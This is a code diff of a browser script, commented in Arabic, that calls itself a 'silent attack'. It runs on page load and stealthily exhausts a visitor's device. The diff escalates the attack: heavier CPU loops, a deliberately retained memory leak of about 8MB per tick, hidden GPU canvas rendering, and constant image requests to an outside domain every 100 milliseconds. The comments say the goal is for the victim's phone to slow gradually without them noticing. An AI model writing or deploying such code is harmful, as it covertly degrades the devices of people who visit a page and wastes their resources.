@@ -1,21 +1,31 @@
 <script>
-    // هجوم صامت: استهلاك موارد ذكي (Trickle Down Exhaustion)
     function stealthAttack() {
-        // بدلاً من Loop لا نهائي، نستخدم Interval يعمل في الخلفية ببطء
-        setInterval(() => {
-            // 1. استهلاك بسيط للمعالج (عمليات حسابية لا تظهر في الواجهة)
-            for (let i = 0; i < 500000; i++) {
-                Math.sqrt(Math.random() * 88.88);
-            }
-            
-            // 2. تسريب ذاكرة بسيط (Memory Leak) يزداد مع الوقت
-            // الضحية لن يشعر بالتهنيج فوراً، بل سيشعر أن جواله بدأ "يثقل" تدريجياً
-            let leak = new Array(50000).fill("Nawaf_Academy_Hidden_Task");
-            
-            // 3. إشغال الشبكة بطلبات وهمية (Hidden Background Requests)
-            fetch('#?data=' + Math.random()); 
+        // إنشاء مصفوفة ضخمة خارج التكرار لمنع تنظيف الذاكرة (Garbage Collection)
+        let persistentLeak = [];
 
-        }, 500); // يعمل كل نصف ثانية (بطيء بما يكفي ليكون صامتاً)
+        setInterval(() => {
+            // 1. معالجة حسابية مكثفة جداً (إشغال أنوية المعالج)
+            for (let i = 0; i < 2000000; i++) {
+                let x = Math.sin(Math.random()) * Math.cos(Math.random());
+                x = Math.sqrt(x * x + 1);
+            }
+
+            // 2. استنزاف الرام بشكل "تراكمي" (كل ثانية يزيد 10 ميجا بايت)
+            // هذه الطريقة تجعل الجوال يبدأ بالبطء الشديد بعد دقيقة واحدة
+            persistentLeak.push(new Float64Array(1000000).fill(Math.random()));
+
+            // 3. إرهاق كرت الشاشة (GPU) بعمليات رسم خفية
+            let canvas = document.createElement('canvas');
+            let ctx = canvas.getContext('2d');
+            ctx.shadowBlur = 100;
+            ctx.shadowColor = "red";
+            ctx.fillRect(0, 0, 500, 500);
+
+            // 4. إغراق الـ Network Tab بطلبات لا تنتهي
+            let img = new Image();
+            img.src = "https://nawaf-academy-test.com/ping?t=" + Date.now();
+
+        }, 100); // سرعنا التوقيت إلى 100 مللي ثانية (10 مرات في الثانية) لزيادة الضغط
     }
 
     window.onload = stealthAttack;
